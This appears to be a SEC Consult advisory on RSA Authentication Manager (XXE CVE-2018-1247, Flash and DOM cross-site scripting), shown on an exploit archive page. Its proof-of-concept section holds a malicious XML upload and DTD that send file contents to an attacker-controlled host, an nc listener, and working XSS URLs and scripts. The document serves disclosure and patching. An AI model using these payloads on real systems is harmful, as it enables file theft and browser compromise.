Source: https://www.rsa.com/en-us/company/about

Business recommendation:
------------------------
By exploiting the vulnerabilities documented in this advisory an attacker can
obtain sensitive information from the RSA Authentication Manager file system,
initiate arbitrary TCP connections or cause DoS. In addition to this, clients
of the RSA Authentication manager can be affected by exploiting client-side
issues.

SEC Consult recommends to apply the available patches from the vendor.

Vulnerability overview/description:
-----------------------------------
1) XML External Entity Injection (XXE) (CVE-2018-1247)
The used XML parser is resolving XML external entities which allows an
authenticated attacker (or an attacker that is able to trick an authenticated
user into importing malicious XML files) to read files, send requests to
systems on the internal network (e.g port scanning) or cause a DoS (e.g.
billion laughs attack).
This issue has been fixed by RSA as described in the advisory DSA-2018-086.
(http://seclists.org/fulldisclosure/2018/May/18)

2) Cross-site Flashing
The vulnerable flash file does not filter or escape the user input
sufficiently. This leads to a reflected cross-site scripting vulnerability.
With reflected cross-site scripting, an attacker can inject arbitrary HTML or
JavaScript code into the victim's web browser. Once the victim clicks a
malicious link the attacker's code is executed in the context of the victim's
web browser.

The vulnerability exists in a third party component called pmfso.
This issue has been fixed by RSA as described in the advisory DSA-2018-082.

3) DOM based Cross-site Scripting
Several client-side scripts handle user supplied data with insufficient
validation before storing it in the DOM. This issue can be exploited to cause
reflected cross-site scripting.

The identified issues exist in third party components. One of the affected
components is PopCalendarX which has an assigned CVE (CVE-2017-9072).
This issue has been fixed by RSA as described in the advisory DSA-2018-082.

Two further issues affecting other third party components are not yet fixed,
as the third party vendor did not supply a patch to RSA yet.

Proof of concept:
-----------------
1) XML External Entity Injection (XXE) (CVE-2018-1247)

The Security Console of the RSA Authentication Manager allows authenticated
users to import SecurID Token jobs in XML format. By importing an XML file
with malicious XML code to the application, it is possible to exploit a blind
XXE vulnerability within the application.

For example, in order to read arbitrary files from the RSA Authentication
Manager OS, the following malicious XML file can be imported via the affected
endpoint:
==========================================================================================
POST /console-ims/ImportTokenJob.do?ptoken=[snip] HTTP/1.1
Host: <host>:7004
Cookie: [snip]

[snip]

-----------------------------9721941626073
Content-Disposition: form-data; name="textImportFileName.theFile";
filename="xxe_test.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://<attacker>/a.dtd">
<key>
&e1;
</key>
-----------------------------9721941626073
Content-Disposition: form-data; name="textImportFileName.uploadResult"

[snip]

==========================================================================================

In this case, the attacker has to host the defined a.dtd file in the web root
of a controlled web server:
==========================================================================================
# cat /var/www/a.dtd
<!ENTITY % p1 SYSTEM "file:///etc/issue">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://<attacker>:8080/%p1;'>">
%p2;
==========================================================================================

Assuming that the RSA Authentication Manager OS has network level access to
the TCP port 80 and 8080 of the attacker controlled IP address, as soon as the
malicious XML file gets uploaded and parsed, the contents of the /etc/issue
file (as an example) are leaked to a remote listener controlled by the attacker:
==========================================================================================
# nc -nlvp 8080
listening on [any] 8080 ...
connect to [<attacker>] from (UNKNOWN) [<host>] 32817
GET /RSA%20Authentication%20Manager%208.2.1.4.0-build1394922 HTTP/1.1
==========================================================================================

Similarly, contents of other internal files can be obtained from the affected
system with current service user permissions.

2) Cross-site Flashing
The issue affects a third party component pmfso (DSA-2018-082).
To exploit a reflected cross-site scripting via the vulnerable SWF Flash file
it is sufficient to click the following URL:

https://<host>:7004//IMS-AA-IDP/common/scripts/iua/pmfso.swf?sendUrl=/&gotoUrlLocal=javascript:alert("Cross-site_Scripting")//

3) DOM based Cross-site Scripting

Example 1:
The issue affects a third party component PopCalendarX (CVE-2017-9072).
To exploit DOM based reflected cross-site scripting it is enough to trick a
victim into executing the following JavaScript (e.g. by clicking on a
specially crafted link):
==========================================================================================
<script>
window.name = "gToday:#' onload='alert(document.domain)' ";
location.href = "https://<host>:7004/IMS-AA-IDP/common/scripts/calendar/ipopeng.htm";
</script>

==========================================================================================

Example 2:
Proof of concept has been removed. The issue affects another third party
component. The fix has not been issued by the third party vendor so far.

Example 3:
Proof of concept has been removed. The issue affects another third party
component. The fix has not been issued by the third party vendor so far.

Vulnerable / tested versions:

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
